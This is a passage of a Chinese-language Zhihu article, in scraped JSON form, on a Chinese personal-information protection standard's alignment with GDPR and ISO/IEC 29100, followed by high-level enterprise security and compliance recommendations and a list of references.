该规范具有以下4个特点：</p><ul><li>充分考虑标准在多方诉求方面的平衡性标准的编制不仅考虑了个人对信息保护的诉求，也同时考虑了社会发展应用的需求、国家安全的需求。做到多方的价值平衡。</li><li>立足国内现有的法律、法规、规章、标准标准的编制考虑到与现有法律、法规、规章、标准要求的一致性。包括全国人大常委会《关于维护互联网安全的决定》、全国人大常委会《关于加强网络信息保护的决定》、《刑法修正案(五)》、《刑法修正案(七)》、《刑法修正案(九)》、《电信和互联网用户个人信息保护规定》、《信息安全技术公共及商用服务信息系统个人信息保护指南》（GB/Z28812-2012）、《信息安全技术信息技术产品供应方行为安全准则》（报批稿）等。</li><li>参考对标国际最先进的规则和立法标准的编制参考了在个人信息保护方面最先进的国外立法。例如， OECD（经济合作与发展组织）隐私框架、APEC（亚洲太平洋经济合作组织）隐私框架等国际规则，欧盟《通用数据保护条例》（GDPR）、欧美“隐私盾”（EU-US Privacy Shield）协议、美国“消费者隐私权法案”（Consumer Privacy Bill of Rights）等欧美个人信息保护方面的立法。</li><li>不是自成一体而是与国际接轨标准的编制在内容上与国际标准接轨，主要参考ISO/IEC 29100系列标准，包括：ISO/IEC 29100《隐私保护框架》、ISO/IEC 29101《隐私体系架构》、ISO/IEC 29190《隐私能力评估模型》、ISO/IEC 29134《隐私影响评估》、ISO/IEC29151《个人可识别信息保护指南》等。此外，还有美国的保护个人身份信息机密性指南（NIST SP800-122）、联邦信息系统隐私与安全控制（NISTSP800-53）；欧盟的数据保护审计实践清单（CWA 15262:2005），管理者的自评估框架（CWA 16112:2010），个人数据保护良好实践（CWA 16113:2010）等。</li></ul><h2>GDPR与企业安全建设</h2><p>GDPR通过TOMs落地，其中要求身份标识与访问控制、日志与审计、备份恢复、开发/测试数据集分离、监控与告警、加密等技术手段。其中大部分属于企业信息安全体系的重要内容，相信借着这个机会，很多企业也会重新梳理自己的安全体系架构。下面按照安全技术体系和组织规范建设分别展开。</p><h2>安全技术体系</h2><ul><li>构建企业网络边界入侵检测系统</li><li>启用内部审计UEBA系统</li><li>在网络与系统边界实施访问控制</li><li>信息采集、存储支持高可用和端-管道-端的统一加密</li></ul><h2>安全组织规范建设</h2><ul><li>需要1个企业级安全应急响应中心（SRC），对外接收安全漏洞与威胁情报，对内组织漏洞修复与安全加固</li><li>需要有明确的数据流转规范，确保敏感数据被加密、隔离，并执行有效的访问控制策略</li><li>需要重视软件供应链安全，确保员工使用安全的工具办公</li><li>需要开展安全教育与培训，避免员工因安全意识薄弱被利用</li></ul><h2>参考资料</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//gdpr-info.eu/art-32-gdpr/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">GDPR官方文档</a></p><p><a href=\"https://link.zhihu.com/?target=http%3A//maxket.com/5-25-gdpr-checklist/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">GDPR检查列表</a></p><p><a href=\"https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s%3F__biz%3DMzI2NDI5MTg4MA%3D%3D%26mid%3D2247485508%26idx%3D1%26sn%3D1d6cc3696d4772a579ef47964e37e803%26chksm%3Deaaf9b03ddd81215cdb62b2bfd7991c3889099016a03f0484b67468b10752dc9008a785e3d2d%26mpshare%3D1%26scene%3D1%26srcid%3D0518c1ynFLJUG1k4a4odJEsJ%23rd\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">隐私保护与数据安全-RSA2018后记</a></p><p><a href=\"https://link.zhihu.com/?target=https%3A//www.tuicool.com/articles/RJrmUbz\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">GDPR实务</a></p><p><a href=\"https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s%3F__biz%3DMjM5Njc3NjM4MA%3D%3D%26mid%3D2651075332%26idx%3D3%26sn%3D77f4e2f2e4b313afa64471356b99b164%26chksm%3Dbd1483d78a630ac1fa8faa62574d351e4ba2fb879b714fba95c8d54504e7efd6d52bbef27855%26mpshare%3D1%26scene%3D1%26srcid%3D0321rYupAtDcZtulgEgn2HxR%23rd\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">至今为止GDPR《通用数据保护规范》解释的最清楚的文章</a></p><p><a href=\"https://link.zhihu.com/?target=http%3A//www.freebuf.com/articles/neopoints/170027.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">EU GDPR：金融机构需注意的GDPR要点分析</a></p><p><a href=\"https://link.zhihu.com/?target=http%3A//www.hireright.com/emea/blog/2018/02/steps-gdpr-compliance-security-technical-measures/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">GDPR合规安全技术措施循序渐进</a></p>", 
            "topic": [
                {
                    "tag": "隐私", 
                    "tagLink": "https://api.zhihu.com/topics/19562726"
                }, 
                {
                    "tag": "GDPR", 
                    "tagLink": "https://api.zhihu.com/topics/20203154"
                }, 
                {
                    "tag": "信息安全", 
                    "tagLink": "https://api.zhihu.com/topics/19561983"
                }
            ], 
            "comments": []
        }
    ], 
    "url": "https://zhuanlan.zhihu.com/tuhao"
}
